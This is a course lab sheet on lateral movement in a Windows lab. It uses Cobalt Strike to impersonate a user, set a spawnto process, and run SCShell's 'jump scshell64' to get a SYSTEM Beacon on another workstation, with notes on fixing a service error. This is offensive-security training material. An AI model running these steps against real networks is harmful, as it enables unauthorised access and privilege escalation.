# Lateral Movement Lab

>The objective of this lab is to impersonate a user and move laterally using SCShell.

===

1. Launch Cobalt Strike and connect to the team server.

## User Impersonation

1. Impersonate the *rsteel* user.

⚠️ You should know how to do this from the Credential Access and User Impersonation chapters of the course.  We are starting to build on previous knowledge.

## Lateral Movement

1. Load the SCShell Aggressor script.
    1. Go to **Cobalt Strike > Script Manager**.
    2. Click **Load**.
    3. Select *C:\Tools\SCShell\CS-BOF\scshell.cna*.

1. SCShell uses the service binary payload, so make sure to set the spawnto first.
    1. `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`

1. Move laterally to *lon-ws-1*.
  1. `jump scshell64 lon-ws-1 smb`
  
⚠️ A new SYSTEM Beacon should appear but you may also see an error message like:
    <pre>Advapi32$StartServiceA failed to start the service. 1056</pre>
    SCshell does not attempt to stop the service first (it assumes it's already stopped). In this case, just wait a few minutes and try again.

⚠️ In this lab, you have learned how to chain credential access, user impersonation, and a lateral movement technique together.
